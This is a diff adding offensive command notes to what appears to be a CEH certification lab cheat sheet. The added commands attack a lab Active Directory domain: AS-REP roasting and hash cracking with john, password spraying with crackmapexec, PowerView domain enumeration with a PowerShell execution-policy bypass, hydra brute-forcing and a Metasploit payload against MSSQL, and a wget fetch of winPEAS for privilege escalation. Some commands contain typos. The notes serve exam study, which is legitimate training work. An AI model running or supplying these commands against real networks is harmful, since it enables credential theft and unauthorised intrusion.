@@ -293,6 +293,69 @@ set session 2
 exploit  
 ```
 
+## Perform Active Directory (AD) Attacks Using Various Tools
+```
+nmap 10.10.1.0/24
+nmap -A -sC -sV 10.10.1.22
+
+AS-REP Roasting Attack
+cd impacket/examples
+python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
+copy joshuahash.txt
+john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
+```
+
+## Spray Cracked
+```
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
+```
+
+## PowerView
+```
+PowerView.ps1
+python3 -m http.server
+http://10.10.1.13:8000/PowerView.ps1
+powershell -EP Bypass
+..\PowerView.ps1
+Get-NetComputer
+Get-NetGroup
+Get-NetUser
+Get-NetOU - Lists all organizational units (OUs) in the domain.
+Get-NetSession - Lists active sessions on the domain.
+Get-NetLoggedon - Lists users currently logged on to machines.
+Get-NetProcess - Lists processes running on domain machines.
+Get-NetService - Lists services on domain machines.
+Get-NetDomainTrust - Lists domain trust relationships.
+Get-ObjectACL - Retrieves ACLs for a specified object.
+Find-InterestingDomainAcl - Finds interesting ACLs in the domain.
+Get-NetSPN - Lists service principal names (SPNs) in the domain.
+Invoke-ShareFinder - Finds shared folders in the domain.
+Invoke-UserHunter - Finds where domain admins are logged in.
+Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines
+```
+##  Perform Attack on MSSQL service
+```
+hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
+python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.
+ SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
+msfconsole
+use exploit/windows/mssql/mssql_payload
+set RHOST 10.10.1.30
+set USERNAME SQL_srv
+set PASSWORD batman
+set DATABASE master
+
+```
+## Perform Privilege Escalation
+```
+python3 -m http.serve
+wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.
+./winpeas.exe
+
+```
+
+
+```
 
 ## Módulo 07 – Malware Threats
 Los labs de este módulo son mayormente basados en GUI (crear/analizar malware con herramientas visuales, sandboxing). No se identificaron comandos CLI adicionales fuera de los ya cubiertos en Módulo 06 (msfvenom, listeners netcat).
